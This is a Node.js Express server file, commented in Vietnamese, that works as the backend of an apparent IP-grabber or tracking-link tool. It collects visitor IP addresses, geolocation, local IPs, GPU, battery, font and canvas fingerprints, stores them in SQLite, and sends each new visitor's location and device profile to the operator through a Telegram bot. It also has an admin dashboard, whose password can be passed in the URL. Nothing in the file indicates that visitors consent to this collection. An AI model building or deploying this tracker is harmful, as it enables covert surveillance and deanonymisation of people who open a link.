require('dotenv').config();
const express = require('express');
const path = require('path');
const fetch = require('node-fetch');
const Database = require('better-sqlite3');

const app = express();
const PORT = process.env.PORT || 3000;

// ===== MIDDLEWARE =====
app.set('trust proxy', true);
app.use(express.json({ limit: '2mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// ===== DATABASE =====
const DB_PATH = process.env.RENDER
  ? '/data/visits.db'
  : path.join(__dirname, 'visits.db');

let db;
try {
  db = new Database(DB_PATH);
} catch (e) {
  console.log('Không mở được /data, dùng thư mục hiện tại');
  db = new Database(path.join(__dirname, 'visits.db'));
}

db.exec(`
  CREATE TABLE IF NOT EXISTS visits (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT,
    time TEXT,
    user_agent TEXT,
    platform TEXT,
    language TEXT,
    screen TEXT,
    cpu_cores INTEGER,
    device_memory REAL,
    gpu_vendor TEXT,
    gpu_renderer TEXT,
    battery TEXT,
    timezone TEXT,
    connection TEXT,
    fonts TEXT,
    local_ips TEXT,
    fingerprint TEXT,
    referrer TEXT,
    country TEXT,
    region TEXT,
    city TEXT,
    isp TEXT,
    lat REAL,
    lon REAL,
    time_on_page TEXT,
    clicks INTEGER,
    scroll_max TEXT,
    raw_json TEXT,
    created_at INTEGER DEFAULT (strftime('%s','now'))
  );
  CREATE INDEX IF NOT EXISTS idx_fingerprint ON visits(fingerprint);
  CREATE INDEX IF NOT EXISTS idx_ip ON visits(ip);
  CREATE INDEX IF NOT EXISTS idx_time ON visits(created_at);
`);

// ===== HELPERS =====
function getClientIP(req) {
  let ip =
    req.headers['cf-connecting-ip'] ||
    req.headers['x-real-ip'] ||
    req.headers['x-forwarded-for']?.split(',')[0].trim() ||
    req.socket.remoteAddress;
  if (ip && ip.startsWith('::ffff:')) ip = ip.substring(7);
  return ip;
}

async function getGeoInfo(ip) {
  try {
    const r = await fetch(
      `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,lat,lon&lang=vi`
    );
    const d = await r.json();
    if (d.status === 'success') {
      return {
        country: d.country,
        region: d.regionName,
        city: d.city,
        isp: d.isp,
        lat: d.lat,
        lon: d.lon
      };
    }
  } catch (e) {}
  return {};
}

async function sendTelegram(visit) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;

  const text = `
🔔 *CÓ MÁY MỚI TRUY CẬP*

🌐 IP: \`${visit.ip}\`
📍 Vị trí: ${visit.city || '?'}, ${visit.region || '?'}, ${visit.country || '?'}
🏢 ISP: ${visit.isp || '?'}
🕐 ${visit.time}

💻 ${visit.platform || '?'}
🌍 ${visit.language || '?'}
🖥️ ${visit.screen || '?'}
⚙️ CPU: ${visit.cpu_cores || '?'} cores
💾 RAM: ${visit.device_memory || '?'} GB
🎮 ${visit.gpu_renderer || '?'}
🔋 ${visit.battery || '?'}
🆔 \`${visit.fingerprint || '?'}\`
  `.trim();

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'Markdown' })
    });
  } catch (e) {
    console.error('Telegram error:', e.message);
  }
}

// ===== API NHẬN DỮ LIỆU =====
app.post('/api/report-ip', async (req, res) => {
  const ip = getClientIP(req);
  const b = req.body || {};
  const time = new Date().toLocaleString('vi-VN');
  const geo = await getGeoInfo(ip);

  const visit = {
    ip,
    time,
    user_agent: b.userAgent || '',
    platform: b.platform || '',
    language: b.language || '',
    screen: b.screen || '',
    cpu_cores: b.cpuCores || null,
    device_memory: b.deviceMemory || null,
    gpu_vendor: b.gpuVendor || '',
    gpu_renderer: b.gpuRenderer || '',
    battery: b.battery ? `${b.battery.level}${b.battery.charging ? ' ⚡' : ''}` : '',
    timezone: b.timezone || '',
    connection: b.connection ? `${b.connection.type} | ${b.connection.downlink}Mbps` : '',
    fonts: b.fonts ? b.fonts.join(', ') : '',
    local_ips: b.localIPs ? b.localIPs.join(', ') : '',
    fingerprint: b.canvasFingerprint || '',
    referrer: b.referrer || '',
    country: geo.country || '',
    region: geo.region || '',
    city: geo.city || '',
    isp: geo.isp || '',
    lat: geo.lat || null,
    lon: geo.lon || null,
    time_on_page: b.timeOnPage || '',
    clicks: b.clicks || 0,
    scroll_max: b.scrollMax || '',
    raw_json: JSON.stringify(b)
  };

  db.prepare(`
    INSERT INTO visits (
      ip, time, user_agent, platform, language, screen,
      cpu_cores, device_memory, gpu_vendor, gpu_renderer,
      battery, timezone, connection, fonts, local_ips,
      fingerprint, referrer, country, region, city, isp,
      lat, lon, time_on_page, clicks, scroll_max, raw_json
    ) VALUES (
      @ip, @time, @user_agent, @platform, @language, @screen,
      @cpu_cores, @device_memory, @gpu_vendor, @gpu_renderer,
      @battery, @timezone, @connection, @fonts, @local_ips,
      @fingerprint, @referrer, @country, @region, @city, @isp,
      @lat, @lon, @time_on_page, @clicks, @scroll_max, @raw_json
    )
  `).run(visit);

  console.log('=== MÁY MỚI ===', ip, '|', visit.city, '|', time);

  sendTelegram(visit).catch(() => {});
  res.json({ ok: true });
});

// ===== ADMIN AUTH =====
function checkAuth(req, res) {
  const pwd = req.headers['x-admin-password'] || req.query.pwd;
  if (pwd !== process.env.ADMIN_PASSWORD) {
    res.status(401).json({ error: 'Sai mật khẩu' });
    return false;
  }
  return true;
}

// ===== ADMIN API =====
app.get('/api/visits', (req, res) => {
  if (!checkAuth(req, res)) return;

  const page = parseInt(req.query.page) || 1;
  const limit = parseInt(req.query.limit) || 50;
  const offset = (page - 1) * limit;
  const search = req.query.search || '';

  let where = '';
  const params = [];
  if (search) {
    where = `WHERE ip LIKE ? OR city LIKE ? OR country LIKE ? OR fingerprint LIKE ?`;
    const s = `%${search}%`;
    params.push(s, s, s, s);
  }

  const total = db.prepare(`SELECT COUNT(*) as c FROM visits ${where}`).get(...params).c;
  const rows = db.prepare(`
    SELECT * FROM visits ${where}
    ORDER BY id DESC LIMIT ? OFFSET ?
  `).all(...params, limit, offset);

  res.json({ total, page, limit, data: rows });
});

app.get('/api/stats', (req, res) => {
  if (!checkAuth(req, res)) return;

  const total = db.prepare('SELECT COUNT(*) as c FROM visits').get().c;
  const uniqueIPs = db.prepare('SELECT COUNT(DISTINCT ip) as c FROM visits').get().c;
  const uniqueFp = db.prepare('SELECT COUNT(DISTINCT fingerprint) as c FROM visits WHERE fingerprint != ""').get().c;
  const today = db.prepare(`
    SELECT COUNT(*) as c FROM visits
    WHERE date(created_at, 'unixepoch') = date('now')
  `).get().c;

  const topCountries = db.prepare(`
    SELECT country, COUNT(*) as c FROM visits
    WHERE country != '' GROUP BY country ORDER BY c DESC LIMIT 10
  `).all();

  const topCities = db.prepare(`
    SELECT city, country, COUNT(*) as c FROM visits
    WHERE city != '' GROUP BY city ORDER BY c DESC LIMIT 10
  `).all();

  const recent24h = db.prepare(`
    SELECT strftime('%H:00', created_at, 'unixepoch') as hour, COUNT(*) as c
    FROM visits
    WHERE created_at > strftime('%s','now') - 86400
    GROUP BY hour ORDER BY hour
  `).all();

  const devices = db.prepare(`
    SELECT
      CASE
        WHEN user_agent LIKE '%iPhone%' THEN 'iPhone'
        WHEN user_agent LIKE '%iPad%' THEN 'iPad'
        WHEN user_agent LIKE '%Android%' THEN 'Android'
        WHEN user_agent LIKE '%Windows%' THEN 'Windows'
        WHEN user_agent LIKE '%Mac OS%' THEN 'macOS'
        WHEN user_agent LIKE '%Linux%' THEN 'Linux'
        ELSE 'Khác'
      END as device,
      COUNT(*) as c
    FROM visits GROUP BY device ORDER BY c DESC
  `).all();

  res.json({ total, uniqueIPs, uniqueFp, today, topCountries, topCities, recent24h, devices });
});

app.delete('/api/visits/:id', (req, res) => {
  if (!checkAuth(req, res)) return;
  db.prepare('DELETE FROM visits WHERE id = ?').run(req.params.id);
  res.json({ ok: true });
});

app.delete('/api/visits', (req, res) => {
  if (!checkAuth(req, res)) return;
  db.prepare('DELETE FROM visits').run();
  res.json({ ok: true });
});

// ===== TRANG ADMIN =====
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// ===== FALLBACK =====
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ===== KHỞI ĐỘNG =====
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server: http://localhost:${PORT}`);
  console.log(`📊 Admin:  http://localhost:${PORT}/admin`);
});
